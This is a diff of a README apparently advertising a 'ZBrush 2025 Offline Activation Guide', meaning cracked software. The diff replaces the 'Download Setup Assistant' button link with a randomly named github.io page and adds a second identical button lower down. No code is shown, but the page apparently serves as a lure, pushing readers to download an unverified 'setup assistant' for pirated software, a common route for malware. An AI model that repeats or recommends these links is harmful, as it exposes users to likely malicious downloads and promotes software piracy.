@@ -1,6 +1,6 @@
 # ZBrush 2025 — Offline Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download%20Setup%20Assistant-222222?style=for-the-badge&logo=zbrush&logoColor=white)](https://zbrush-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download%20Setup%20Assistant-222222?style=for-the-badge&logo=zbrush&logoColor=white)](https://ryadikmntiiks.github.io/.github/ZBR)
 
 ---
 
@@ -34,6 +34,8 @@
 
 ![ZBrush Export Panel](https://bing.com/th/id/OIP.im4GYmP2NtksRKJDb2uPWgHaEZ?o=7&cb=thvnextc2rm=3&rs=1&pid=ImgDetMain)  
 *Offline export and integration settings unlocked*
+
+[![Download Setup Assistant](https://img.shields.io/badge/Download%20Setup%20Assistant-222222?style=for-the-badge&logo=zbrush&logoColor=white)](https://ryadikmntiiks.github.io/.github/ZBR)
 
 ---
 
